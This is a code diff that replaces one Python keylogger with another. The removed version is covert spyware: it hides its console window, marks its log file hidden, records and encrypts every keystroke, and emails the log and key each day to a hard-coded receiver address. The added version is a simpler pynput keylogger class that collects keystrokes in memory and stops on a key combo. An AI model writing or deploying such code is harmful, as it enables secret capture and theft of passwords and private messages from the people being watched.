@@ -1,110 +1,53 @@
-import os
-import sys
-import argparse
-import logging
-import time
-import ctypes
+import pynput.keyboard
+import pynput.mouse
+import threading
 
-from pynput import keyboard
-from datetime import datetime, timedelta
-from utils import generate_key, save_key, encrypt_data, send_email
+KEY = pynput.keyboard.Key
 
-def hide_console():
-    if os.name == 'nt':
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-def on_press(key, log_file, key_obj):
-    try:
-        data = f"Key pressed: {key.char}"
-    except AttributeError:
-        data = f"Special key pressed: {key}"
+class Keylogger:
+    def __init__(self, escape_combo=(KEY.shift, KEY.f1)):
+        self.key_log = ""
+        self.keylogger_running = False
+        self.key_combo = []
+        self.escape_combo = list(escape_combo)
+        self.key_listener = pynput.keyboard.Listener(on_press=self.on_keyboard_event)
 
-    encrypted_data = encrypt_data(data, key_obj)
-    with open(log_file, "ab") as file:
-        file.write(encrypted_data + b'\n')
+    def start(self):
+        self.key_listener.start()
+        self.keylogger_running = True
 
-def on_release(key, log_file, key_obj):
-    try:
-        key_char = key.char
-    except AttributeError:
-        key_char = str(key)
+    def get_key_log(self):
+        return self.key_log
 
-    data = f"Key released: {key_char}"
-    encrypted_data = encrypt_data(data, key_obj)
-    with open(log_file, "ab") as file:
-        file.write(encrypted_data + b'\n')
+    def clear_key_log(self):
+        self.key_log = ""
 
-    if key == keyboard.Key.esc:
-        return False
+    def stop_key_logger(self):
+        self.key_listener.stop()
+        self.keylogger_running = False
+        threading.Thread.__init__(self.key_listener)
 
-def send_log_email(log_file, key_file, email_config):
-    """
-    Send the log file and key file via email.
-    """
-    send_email(
-        email_config['smtp_server'],
-        email_config['port'],
-        email_config['sender_email'],
-        email_config['sender_password'],
-        email_config['receiver_email'],
-        "Keylogger Log and Key",
-        "Attached are the keylogger log file and the encryption key.",
-        [log_file, key_file]
-    )
+    def on_keyboard_event(self, event):
+        if event == KEY.backspace:
+            self.key_log += " [Bck] "
+        elif event == KEY.tab:
+            self.key_log += " [Tab] "
+        elif event == KEY.enter:
+            self.key_log += "\n"
+        elif event == KEY.space:
+            self.key_log += " "
+        elif type(event) == KEY:  # if the character is some other type of special key
+            self.key_log += " [" + str(event)[4:] + "] "
+        else:
+            self.key_log += str(event)[1:len(str(event)) - 1]  # remove quotes around
 
-def start_keylogger(log_file, email_config=None, send_time=None):
-    key = generate_key()
-    save_key(key)
+        self.check_escape_char(event)
 
-    # Hide the log file
-    if os.name == 'nt':  # Check if the OS is Windows
-        os.system(f'attrib +h {log_file}')
-
-    next_send_time = datetime.now() + timedelta(days=1) if send_time else None
-
-    with keyboard.Listener(
-        on_press=lambda event: on_press(event, log_file, key),
-        on_release=lambda event: on_release(event, log_file, key)
-    ) as listener:
-        try:
-            while True:
-                listener.join(1)
-                if send_time and datetime.now() >= next_send_time:
-                    send_log_email(log_file, "secret.key", email_config)
-                    next_send_time += timedelta(days=1)
-        except KeyboardInterrupt:
-            print("Keylogger stopped by user")
-            listener.stop()
-        except Exception as e:
-            logging.error(f"Error: {e}")
-
-def main():
-    parser = argparse.ArgumentParser(description="keylogger")
-    parser.add_argument("--log-file", default="log.txt", help="Path to the log file")
-    parser.add_argument("--send-email", action="store_true", help="Enable email sending")
-    parser.add_argument("--send-time", default="22:00", help="Time to send the email (HH:MM)")
-    parser.add_argument("--smtp-server", default="smtp.gmail.com", help="SMTP server for sending email")
-    parser.add_argument("--port", type=int, default=587, help="SMTP server port")
-    parser.add_argument("--sender-email", default="", help="Sender email address")
-    parser.add_argument("--sender-password", default="", help="Sender email password")
-    parser.add_argument("--receiver-email", default="zesh3ng@gmail.com", help="Receiver email address")
-    args = parser.parse_args()
-
-    email_config = None
-    send_time = None
-    if args.send_email:
-        email_config = {
-            'smtp_server': args.smtp_server,
-            'port': args.port,
-            'sender_email': args.sender_email,
-            'sender_password': args.sender_password,
-            'receiver_email': args.receiver_email
-        }
-        send_time = datetime.strptime(args.send_time, "%H:%M").time()
-
-    start_keylogger(args.log_file, email_config, send_time)
-
-if __name__ == "__main__":
-    main()
-
-hide_console()
+    def check_escape_char(self, key):
+        self.key_combo.append(key)
+        if key != self.escape_combo[len(self.key_combo) - 1]:
+            self.key_combo = []
+        else:
+            if self.key_combo == self.escape_combo:
+                self.stop_key_logger()
